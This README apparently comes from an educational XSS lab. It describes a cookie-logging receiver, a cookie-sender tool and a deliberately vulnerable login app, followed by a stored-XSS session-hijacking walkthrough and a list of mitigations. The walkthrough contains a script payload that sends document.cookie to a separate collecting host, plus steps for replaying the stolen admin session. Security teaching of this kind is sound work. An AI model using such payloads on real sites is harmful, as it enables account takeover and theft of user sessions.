# XSS Security Testing Demo

This project demonstrates XSS (Cross-Site Scripting) vulnerabilities and session hijacking for educational purposes.

## Files

### 1. xss-receiver-node.js (Port 3333)
**XSS Data Receiver / Logger**
- Logs all incoming requests with query parameters
- Displays cookies, referer, user-agent, IP, timestamp
- Auto-refreshes every 5 seconds
- Shows last 50 requests
- Clear logs button
- Uses Estonia/Tallinn timezone

**Usage:**
```bash
bun xss-receiver-node.js
```

**Access:** http://localhost:3333

### 2. cookie-sender.js (Port 3334)
**Cookie Sender Testing Tool**
- Set test cookies with custom names/values
- Clear all cookies
- Send cookies to receiver (port 3333) using 3 methods:
  - Navigation (changes page)
  - Image tag (background request)
  - Fetch API (background request)

**Usage:**
```bash
bun cookie-sender.js
```

**Access:** http://localhost:3334

### 3. vulnerable-demo.js (Port 3335)
**UserHub - Vulnerable Authentication Demo**
- Complete authentication system with login/register
- Session-based authentication (vulnerable - no HttpOnly flag)
- Multiple endpoints: /, /login, /register, /users, /messages, /admin, /logout
- Shared messages board (vulnerable to stored XSS)
- Role-based access control (admin/user)

**Test Accounts:**
- `admin / admin123` (Admin role - can access /admin)
- `john / john123` (User role - cannot access /admin)

**Usage:**
```bash
bun vulnerable-demo.js
```

**Access:** http://localhost:3335

## Demo: Stored XSS Attack

### Step 1: Setup
```bash
# Terminal 1 - Start XSS Receiver
bun xss-receiver-node.js

# Terminal 2 - Start Vulnerable Demo
bun vulnerable-demo.js
```

### Step 2: Attack as Regular User (john)
1. Visit http://localhost:3335/login
2. Login: `john / john123`
3. Go to http://localhost:3335/messages
4. Post this message:
   ```html
   <script>fetch('http://localhost:3333/?stolen='+document.cookie)</script>
   ```

### Step 3: Victim Views Message (admin)
1. Open another browser/incognito window
2. Visit http://localhost:3335/login
3. Login: `admin / admin123`
4. Go to http://localhost:3335/messages
5. **XSS payload executes automatically!**

### Step 4: Steal the Session
1. Check http://localhost:3333
2. See the stolen admin sessionId cookie
3. Copy the sessionId value
4. In a new browser, manually set the cookie:
   ```javascript
   document.cookie = "sessionId=<stolen_value>; path=/"
   ```
5. Visit http://localhost:3335/users - **You're now logged in as admin!**

## Security Vulnerabilities Demonstrated

### Port 3335 (Vulnerable Demo)
1. **No Input Sanitization** - Messages rendered without escaping HTML
2. **No HttpOnly Flag** - sessionId cookie accessible via JavaScript
3. **Stored XSS** - Malicious scripts saved in database and executed for all users
4. **No CSRF Protection** - Forms don't validate request origin
5. **Session Fixation** - No session regeneration after login

### Real-World Mitigation
- ✅ Always sanitize/escape user input before rendering
- ✅ Use HttpOnly flag on session cookies
- ✅ Implement Content Security Policy (CSP)
- ✅ Use CSRF tokens on forms
- ✅ Regenerate session ID after authentication
- ✅ Set SameSite cookie attribute
- ✅ Implement rate limiting

## Requirements

- Bun v1.0+
- No external dependencies (uses built-in http and crypto modules)

## Deployment

To deploy to a remote server:
```bash
scp *.js user@server:~/
ssh user@server
bun xss-receiver-node.js &
bun vulnerable-demo.js &
```

## Notes

⚠️ **FOR EDUCATIONAL PURPOSES ONLY**

This code is intentionally vulnerable and should NEVER be used in production. It demonstrates common security vulnerabilities for learning and testing purposes only.

## License

Educational use only. Use at your own risk.
